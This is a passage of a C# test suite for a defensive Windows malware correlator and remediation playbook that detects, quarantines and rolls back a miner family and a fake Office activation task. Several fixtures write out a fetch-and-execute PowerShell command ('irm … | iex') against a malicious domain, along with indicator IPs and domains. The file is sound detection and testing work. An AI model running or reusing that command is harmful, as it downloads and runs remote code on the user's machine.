        Assert.Equal(Severity.Medium, d.Severity);
        Assert.False(d.ChainConfirmed);
    }

    [Fact]
    public void KnownFamilyFolder_WithChain_IsCritical_WithIocs()
    {
        const string caa = @"C:\ProgramData\CAAService\CAAServices.exe";
        var entry = RunEntry(caa, null) with
        {
            Name = "CAA Service",
            Findings =
            [
                AuditFinding.Create("PERS-RUN-USERWRITABLE-UNSIGNED", Severity.Medium, "t", "d"),
                AuditFinding.Create("PERS-FAMILY-IOC", Severity.High, "t", "d", Evidence.Of("family", "CAAService")),
            ],
        };
        var detections = ThreatFamilyCorrelator.Correlate(new FamilyCorrelationInput
        {
            Persistence = new PersistenceAuditReport([entry]),
            Config = Exclusion(@"C:\ProgramData\CAAService"),
        });

        var d = Assert.Single(detections);
        Assert.Equal(Severity.Critical, d.Severity);
        Assert.Equal("CAAService", d.Family!.Id);
        Assert.Contains("155.212.215.227", d.Artifacts.IpAddresses);
        Assert.Contains("prl-ru.kryptex.network", d.Artifacts.Domains);
    }

    [Fact]
    public void TechiasTask_WithPowershellExclusion_IsCritical()
    {
        var xml = FamilyFixtures.TaskXml("powershell.exe", "-Command \"irm https://activate.techias.co.uk/ | iex\"");
        var task = TaskXmlParser.Parse(@"Microsoft\Office\Office Persistent Activation", @"\Microsoft\Office\Office Persistent Activation", xml);
        var persistence = new PersistenceAuditor(new PersistenceAuditorOptions(), tasks: new FakeTaskProvider(task)).Audit();
        var config = new ConfigAuditReport([])
        {
            DefenderExclusions = [new DefenderExclusion(DefenderExclusionKind.Process, "powershell.exe", "k")],
        };

        var d = Assert.Single(ThreatFamilyCorrelator.Correlate(new FamilyCorrelationInput { Persistence = persistence, Config = config }));

        Assert.Equal(Severity.Critical, d.Severity);
        Assert.Contains("activate.techias.co.uk", d.Artifacts.Domains);
        Assert.Single(d.Artifacts.Exclusions);
    }

    [Fact]
    public void TrustedVendorFolders_AreNeverCorrelated()
    {
        var detections = ThreatFamilyCorrelator.Correlate(new FamilyCorrelationInput
        {
            Persistence = new PersistenceAuditReport([RunEntry(@"C:\ProgramData\Microsoft\Windows Defender\Platform\MpCmdRun.exe", T0)]),
            Config = Exclusion(@"C:\ProgramData\Microsoft\Windows Defender"),
        });
        Assert.Empty(detections);
    }

    [Fact]
    public void ProcessOrder_PutsLoaderBeforePayload()
    {
        var miner = new ProcessSnapshot { Pid = 300, ParentPid = 200, Name = "m.exe" };
        var loader = new ProcessSnapshot { Pid = 200, ParentPid = 100, Name = "l.exe" };
        var ordered = ThreatFamilyCorrelator.OrderProcesses([miner, loader]);
        Assert.Equal([200, 300], ordered.Select(p => p.Process.Pid).ToArray());
        Assert.Equal(FamilyProcessRole.Loader, ordered[0].Role);
        Assert.Equal(FamilyProcessRole.Payload, ordered[1].Role);
    }

    [Fact]
    public void DefenderEvent5007_IsParsedFromWevtutilXml()
    {
        const string xml = """
            <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>5007</EventID><TimeCreated SystemTime='2026-11-14T08:24:12.1234567Z'/></System>
            <EventData><Data Name='Old Value'></Data><Data Name='New Value'>HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\CAAService = 0x0</Data></EventData></Event>
            <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>5007</EventID><TimeCreated SystemTime='2026-11-14T08:24:13Z'/></System>
            <EventData><Data Name='Old Value'></Data><Data Name='New Value'>HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes\powershell.exe = 0x0</Data></EventData></Event>
            <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>5007</EventID><TimeCreated SystemTime='2026-11-14T08:25:00Z'/></System>
            <EventData><Data Name='Old Value'></Data><Data Name='New Value'>HKLM\SOFTWARE\Microsoft\Windows Defender\Scan\AvgCPULoadFactor = 0x32</Data></EventData></Event>
            """;
        var changes = DefenderEventParser.ParseWevtutilXml(xml);
        Assert.Equal(2, changes.Count);
        Assert.Equal((DefenderExclusionKind.Path, @"C:\ProgramData\CAAService", true), (changes[0].Kind, changes[0].Value, changes[0].Added));
        Assert.Equal(DateTimeKind.Utc, changes[0].TimeUtc.Kind);
        Assert.Equal(DefenderExclusionKind.Process, changes[1].Kind);
    }
}

// ---- Плейбук нейтрализации --------------------------------------------------------------------

public class ThreatFamilyPlaybookTests
{
    private const string TaskPath = @"\Microsoft\Office\Office Persistent Activation";
    private const string RuleId = "{D3A1B2C4-0000-4000-8000-000000000001}";

    private sealed class Fixture : IDisposable
    {
        public TempDir Tmp { get; } = new();
        public FakeProcessHost Host { get; } = new();
        public InMemoryRegistryProvider Registry { get; } = new();
        public FakeTaskEditor Tasks { get; } = new();
        public FakeDefender Defender { get; } = new();
        public FakeFirewallEditor Firewall { get; } = new();
        public string Folder { get; }
        public string LoaderPath { get; }
        public string MinerPath { get; }
        public string HostsPath { get; }
        public string Data => Path.Combine(Tmp.Path, "data");
        public RegistryKeyPath RunKey { get; } = new(RegistryHive.LocalMachine, FamilyFixtures.RunKey);
        public string RawRule { get; }

        public Fixture()
        {
            Folder = Path.Combine(Tmp.Path, "ProgramData", "NetSvcHelper");
            LoaderPath = Tmp.Write(Path.Combine("ProgramData", "NetSvcHelper", "NetSvcHelper.exe"), SyntheticArtifacts.BuildPe());
            MinerPath = Tmp.Write(Path.Combine("ProgramData", "NetSvcHelper", "Microsoft Network Realtime lnspection Service.exe"), SyntheticArtifacts.BuildPe());
            Tmp.WriteText(Path.Combine("ProgramData", "NetSvcHelper", "Autotune", "tune.dat"), "synthetic");
            HostsPath = Tmp.WriteText("hosts", "127.0.0.1 localhost\r\n");
            Host.Add(100, 50, "explorer.exe", @"C:\Windows\explorer.exe")
                .Add(200, 100, "NetSvcHelper.exe", LoaderPath)
                .Add(300, 200, "Microsoft Network Realtime lnspection Service.exe", MinerPath);
            Registry.Set(RunKey, "Net Svc Helper", LoaderPath);
            Tasks.Tasks[TaskPath] = FamilyFixtures.TaskXml("powershell.exe", "-Command \"irm https://activate.techias.co.uk/ | iex\"");
            Defender.Exclusions.Add((DefenderExclusionKind.Path, Folder));
            Defender.Exclusions.Add((DefenderExclusionKind.Process, "powershell.exe"));
            RawRule = $"v2.31|Action=Allow|Active=TRUE|Dir=Out|App={MinerPath}|Name=Network Discovery (SSDP-Out)|";
            Firewall.Rules[RuleId] = RawRule;
        }

        public RemediationEngine Engine() => new(
            new FakeWhitelist(),
            new RemediationOptions { RollbackManifestPath = Path.Combine(Data, "rollback_manifest.json"), CurrentProcessId = 999_999 },
            Host, Host, Registry, Tasks, Defender, firewall: Firewall);

        public QuarantineManager Quarantine() => new(new FakeWhitelist(), new QuarantineOptions { QuarantineDirectory = Path.Combine(Data, "Quarantine") });

        public FamilyDetection Detection()
        {
            var run = new PersistenceEntry
            {
                Kind = PersistenceKind.RegistryRun, Location = RunKey.ToString(), Name = "Net Svc Helper", Command = LoaderPath, ResolvedTarget = LoaderPath,
                Findings = [AuditFinding.Create("PERS-RUN-USERWRITABLE-UNSIGNED", Severity.Medium, "t", "d")],
            };
            var task = new PersistenceEntry
            {
                Kind = PersistenceKind.ScheduledTask, Location = TaskPath, Name = "Office Persistent Activation",
                Command = "powershell.exe -Command \"irm https://activate.techias.co.uk/ | iex\"",
                Findings = [AuditFinding.Create("PERS-TASK-DOWNLOAD-EXEC", Severity.Critical, "t", "d")],
            };
            var processes = Host.GetProcesses().Where(p => p.Pid != 100).Reverse().ToList(); // майнер первым — порядок должен исправиться
            return new FamilyDetection
            {
                Key = Folder,
                Severity = Severity.High,
                Verdict = ThreatFamilyCorrelator.ChainVerdict,
                ChainConfirmed = true,
                Signals = ["синтетическая связка"],
                Artifacts = new FamilyArtifacts
                {
                    Folders = [Folder],
                    Files = [LoaderPath, MinerPath],
                    Persistence = [run, task],
                    Exclusions =
                    [
                        new DefenderExclusion(DefenderExclusionKind.Path, Folder, "k"),
                        new DefenderExclusion(DefenderExclusionKind.Process, "powershell.exe", "k"),
                    ],
                    FirewallRules = [FirewallRuleParser.Parse(RuleId, RawRule)],
                    Processes = ThreatFamilyCorrelator.OrderProcesses(processes),
                    IpAddresses = ["155.212.215.227", "43.174.218.73"],
                    Domains = ["activate.techias.co.uk", "prl-ru.kryptex.network"],
                },
            };
        }

        public FamilyVerificationProbe Probe() => new()
        {
            Processes = Host.GetProcesses,
            Exclusions = () => Defender.Exclusions.Select(e => new DefenderExclusion(e.Kind, e.Value, "k")).ToList(),
            Persistence = () => new PersistenceAuditReport([]),
        };

        public ThreatFamilyPlaybook Playbook(RemediationEngine? engine, QuarantineManager? quarantine, bool confirmed, bool auditOnly = false) =>
            new(engine, quarantine, new ThreatFamilyPlaybookOptions
            {
                DataDirectory = Data,
                AuditOnly = auditOnly,
                Confirmed = confirmed,
                BlockIoc = true,
                HostsPath = HostsPath,
                Delay = (_, _) => Task.CompletedTask,
            }, Probe());

        public void Dispose() => Tmp.Dispose();
    }

    [Fact]
    public async Task Execute_StopsLoaderFirst_CleansEverything_AndWritesCompleteManifest()
    {
        using var f = new Fixture();
        var engine = f.Engine();
        using var quarantine = f.Quarantine();

        var result = await f.Playbook(engine, quarantine, confirmed: true).ExecuteAsync([f.Detection()]);

        Assert.True(result.Executed);
        Assert.Equal([200, 300], f.Host.Killed.ToArray()); // загрузчик (родитель) первым
        Assert.Null(f.Registry.GetValue(f.RunKey, "Net Svc Helper"));
        Assert.False(f.Tasks.Tasks.ContainsKey(TaskPath));
        Assert.Empty(f.Defender.Exclusions);
        Assert.False(f.Firewall.Rules.ContainsKey(RuleId));
        Assert.False(File.Exists(f.LoaderPath));
        Assert.False(File.Exists(f.MinerPath));
        Assert.False(Directory.Exists(f.Folder));
        Assert.Equal(3, result.Quarantined.Count(q => q.Status == QuarantineStatus.Quarantined));
        Assert.Contains("0.0.0.0 activate.techias.co.uk", await File.ReadAllTextAsync(f.HostsPath), StringComparison.Ordinal);
        Assert.Contains("155.212.215.227", Assert.Single(f.Firewall.BlockRules).Value);
        Assert.True(result.Verification!.Clean, string.Join("; ", result.Verification.Problems));
        Assert.True(result.RebootRecommended);
        Assert.True(ThreatFamilyPlaybook.HasPendingRecheck(f.Data));

        // Шаги плана идут строго в порядке плейбука.
        var kinds = result.Plan.Select(s => (int)s.Kind).ToArray();
        Assert.Equal(kinds.Order().ToArray(), kinds);
        Assert.StartsWith("PID 200", result.Plan.First(s => s.Kind == PlaybookStepKind.StopProcess).Target, StringComparison.Ordinal);

        var manifest = engine.ListRollbackEntries();
        Assert.Contains(manifest, e => e.Kind == RollbackKind.RegistryValue && e.Name == "Net Svc Helper" && e.PreviousValue == f.LoaderPath);
        Assert.Contains(manifest, e => e.Kind == RollbackKind.ScheduledTask && e.PreviousValue!.Contains("techias", StringComparison.Ordinal));
        Assert.Equal(2, manifest.Count(e => e.Kind == RollbackKind.DefenderExclusion));
        Assert.Contains(manifest, e => e.Kind == RollbackKind.FirewallRule && e.PreviousValue == f.RawRule);
        Assert.Contains(manifest, e => e.Kind == RollbackKind.FirewallBlockRule);
        Assert.Contains(manifest, e => e.Kind == RollbackKind.HostsFile);
        Assert.Contains(manifest, e => e.Kind == RollbackKind.EmptyDirectory);
        Assert.All((await quarantine.ListAsync()).Where(r => r.OriginalPath.StartsWith(f.Folder, StringComparison.Ordinal)),
            r => Assert.Equal(64, r.Sha256.Length));

        Assert.Contains("newvirus@kaspersky.com", result.UserMessage, StringComparison.Ordinal);
        Assert.Contains("двухфакторную", result.UserMessage, StringComparison.Ordinal);
        Assert.Contains("rollback undo", result.UserMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Rollback_RestoresTaskRunExclusionsRulesAndHosts()
    {
        using var f = new Fixture();
        var engine = f.Engine();
        using var quarantine = f.Quarantine();
        var hostsBefore = await File.ReadAllTextAsync(f.HostsPath);
        await f.Playbook(engine, quarantine, confirmed: true).ExecuteAsync([f.Detection()]);

        foreach (var entry in engine.ListRollbackEntries().Reverse())
        {
            Assert.Equal(RemediationStatus.Done, engine.Undo(entry.Id).Status);
        }

        Assert.Equal(f.LoaderPath, f.Registry.GetValue(f.RunKey, "Net Svc Helper")!.Value);
        Assert.Contains("techias", f.Tasks.Tasks[TaskPath], StringComparison.Ordinal);
        Assert.Contains((DefenderExclusionKind.Path, f.Folder), f.Defender.Exclusions);
        Assert.Contains((DefenderExclusionKind.Process, "powershell.exe"), f.Defender.Exclusions);
        Assert.Equal(f.RawRule, f.Firewall.Rules[RuleId]);
        Assert.Empty(f.Firewall.BlockRules);
        Assert.Equal(hostsBefore, await File.ReadAllTextAsync(f.HostsPath));
        Assert.True(Directory.Exists(f.Folder));

        foreach (var record in await quarantine.ListAsync())
        {
            Assert.Equal(RestoreStatus.Restored, (await quarantine.RestoreAsync(record.Id)).Status);
        }

        Assert.True(File.Exists(f.LoaderPath));
        Assert.True(File.Exists(f.MinerPath));
    }

    [Fact]
    public async Task AuditOnly_OrWithoutConfirmation_ChangesNothing_ButWritesEvidence()
    {
        using var f = new Fixture();
        var engine = f.Engine();
        using var quarantine = f.Quarantine();

        foreach (var (confirmed, auditOnly) in new[] { (false, false), (true, true) })
        {
            var result = await f.Playbook(engine, quarantine, confirmed, auditOnly).ExecuteAsync([f.Detection()]);
            Assert.False(result.Executed);
            Assert.Contains("Ничего не изменено", result.UserMessage, StringComparison.Ordinal);
            Assert.True(File.Exists(result.EvidenceJsonPath));
            Assert.True(File.Exists(result.EvidenceHtmlPath));
            Assert.Contains(f.LoaderPath.Replace("\\", "\\\\", StringComparison.Ordinal), await File.ReadAllTextAsync(result.EvidenceJsonPath!), StringComparison.Ordinal);
        }

        Assert.Empty(f.Host.Killed);
        Assert.NotNull(f.Registry.GetValue(f.RunKey, "Net Svc Helper"));
        Assert.True(f.Tasks.Tasks.ContainsKey(TaskPath));
        Assert.Equal(2, f.Defender.Exclusions.Count);
        Assert.True(f.Firewall.Rules.ContainsKey(RuleId));
        Assert.True(File.Exists(f.LoaderPath));
        Assert.Empty(engine.ListRollbackEntries());
        Assert.False(ThreatFamilyPlaybook.HasPendingRecheck(f.Data));
    }

    [Fact]
    public async Task MediumDetection_IsNeverRemediated()
    {
        using var f = new Fixture();
        var engine = f.Engine();
        using var quarantine = f.Quarantine();
        var medium = f.Detection() with { Severity = Severity.Medium, ChainConfirmed = false };

        var result = await f.Playbook(engine, quarantine, confirmed: true).ExecuteAsync([medium]);

        Assert.False(result.Executed);
        Assert.Single(result.Plan); // только снимок улик
        Assert.True(File.Exists(f.LoaderPath));
    }

    [Fact]
    public void Verify_ReportsRecreatedFile_ReturnedExclusion_AndRemainingPersistence()
    {
        using var f = new Fixture();
        var detection = f.Detection();
        var leftover = new PersistenceEntry
        {
            Kind = PersistenceKind.ScheduledTask, Location = @"\Microsoft\Windows\Maintenance\Restart", Name = "Restart",
            Findings = [AuditFinding.Create("PERS-TASK-DOWNLOAD-EXEC", Severity.High, "t", "d")],
        };
        var playbook = new ThreatFamilyPlaybook(null, null, new ThreatFamilyPlaybookOptions { DataDirectory = f.Data }, f.Probe() with
        {
            Persistence = () => new PersistenceAuditReport([leftover]),
        });

        var result = playbook.Verify([detection]);

        Assert.False(result.Clean);
        Assert.Contains(result.Problems, p => p.Contains("Файл снова существует", StringComparison.Ordinal));
        Assert.Contains(result.Problems, p => p.Contains("Исключение вернулось", StringComparison.Ordinal));
        Assert.Contains(result.Problems, p => p.Contains("Процесс снова запущен", StringComparison.Ordinal));
        Assert.Contains(result.Problems, p => p.Contains("Powedon", StringComparison.Ordinal));
    }

    [Fact]
    public async Task GenuineOfficeTask_IsNeverDeleted()
    {
        using var f = new Fixture();
        const string office = @"\Microsoft\Office\Office Automatic Updates 2.0";
        f.Tasks.Tasks[office] = "<Task/>";
        var genuine = new PersistenceEntry
        {
            Kind = PersistenceKind.ScheduledTask, Location = office, Name = "Office Automatic Updates 2.0",
            ResolvedTarget = @"C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe",
            Findings = [AuditFinding.Create("PERS-TASK-USERWRITABLE", Severity.Medium, "t", "d")],
        };
        Assert.True(ThreatFamilyPlaybook.IsGenuineOfficeTask(genuine));
        var detection = f.Detection();
        detection = detection with { Artifacts = detection.Artifacts with { Persistence = [.. detection.Artifacts.Persistence, genuine] } };
        using var quarantine = f.Quarantine();

        var result = await f.Playbook(f.Engine(), quarantine, confirmed: true).ExecuteAsync([detection]);

        Assert.True(f.Tasks.Tasks.ContainsKey(office));
        Assert.Contains(result.Actions, a => a.Target.Contains("Office Automatic Updates", StringComparison.Ordinal) && a.Status == RemediationStatus.Blocked);
    }

    [Fact]
    public void FirewallRemoval_RefusesBuiltInResourceNamedRules()
    {
        using var f = new Fixture();
        var builtIn = FirewallRuleParser.Parse("NETDIS-SSDPSrv-Out-UDP", @"v2.31|Action=Allow|Active=TRUE|Dir=Out|App=%SystemRoot%\system32\svchost.exe|Name=@FirewallAPI.dll,-32788|");
        Assert.Equal(RemediationStatus.Blocked, f.Engine().RemoveFirewallRule(builtIn, "test").Status);
    }

    [Fact]
    public async Task RecheckAfterReboot_ClearsMarkerWhenClean()
    {
        using var f = new Fixture();
        using var quarantine = f.Quarantine();
        var options = new ThreatFamilyPlaybookOptions { DataDirectory = f.Data, AuditOnly = false, Confirmed = true, HostsPath = f.HostsPath, Delay = (_, _) => Task.CompletedTask };
        await new ThreatFamilyPlaybook(f.Engine(), quarantine, options, f.Probe()).ExecuteAsync([f.Detection()]);
        Assert.True(ThreatFamilyPlaybook.HasPendingRecheck(f.Data));

        var recheck = new ThreatFamilyPlaybook(null, null, new ThreatFamilyPlaybookOptions { DataDirectory = f.Data }, f.Probe()).RunPendingRecheck();

        Assert.NotNull(recheck);
        Assert.True(recheck.Clean, string.Join("; ", recheck.Problems));
        Assert.False(ThreatFamilyPlaybook.HasPendingRecheck(f.Data));
    }

    [Fact]
    public void UserMessage_NamesPiratedActivatorVector()
    {
        var detection = new FamilyDetection
        {
            Key = "k", Severity = Severity.Critical, Verdict = "v", Family = ThreatFamilyCatalog.Techias,
            Artifacts = new FamilyArtifacts(),
        };
        var message = ThreatFamilyPlaybook.BuildUserMessage([detection], [], [], null, executed: false, null);
        Assert.Contains("пиратский активатор", message, StringComparison.Ordinal);
        Assert.Contains("смените пароли с чистого устройства", message, StringComparison.Ordinal);
    }
}

// ---- Служба: поведенческие находки семейства ждут решения пользователя ----------------------

public class FamilyFindingPolicyTests
{
    [Fact]
    public void BehavioralOnly_RequiresDecision_IndependentSignature_DoesNot()
    {
        AuditFinding[] behavioral = [AuditFinding.Create("PERS-TASK-DOWNLOAD-EXEC", Severity.Critical, "t", "d"), AuditFinding.Create("PROC-CMD-IEX", Severity.Medium, "t", "d")];
        AuditFinding[] withSignature = [.. behavioral, AuditFinding.Create("PERS-FILE-SNT-FAM-CAA-0001", Severity.Critical, "t", "d")];
        AuditFinding[] lowOnly = [AuditFinding.Create("PROC-NET-POOLPORT", Severity.Medium, "t", "d")];

        Assert.NotNull(FamilyFindingPolicy.DecisionReason(behavioral));
        Assert.Null(FamilyFindingPolicy.DecisionReason(withSignature));
        Assert.Null(FamilyFindingPolicy.DecisionReason(lowOnly));
    }

    [Fact]
    public async Task Dispatcher_MasqueradeTask_IsPendingDecision_NotDeleted()
    {
        using var b = new DispatcherBench();
        var entry = new PersistenceEntry
        {
            Kind = PersistenceKind.ScheduledTask,
            Location = @"\Microsoft\Office\Office Persistent Activation",
            Name = "Office Persistent Activation",
            Command = "powershell.exe -Command \"irm https://activate.techias.co.uk/ | iex\"",
            Findings = [AuditFinding.Create("PERS-TASK-DOWNLOAD-EXEC", Severity.Critical, "t", "d")],
        };

        var threat = await b.Dispatcher.DispatchPersistenceAsync(entry);

        Assert.NotNull(threat);
        Assert.Equal(Realtime.ThreatStatus.PendingDecision, threat.Status);
        Assert.Empty(b.Engine.ListRollbackEntries());
    }
}
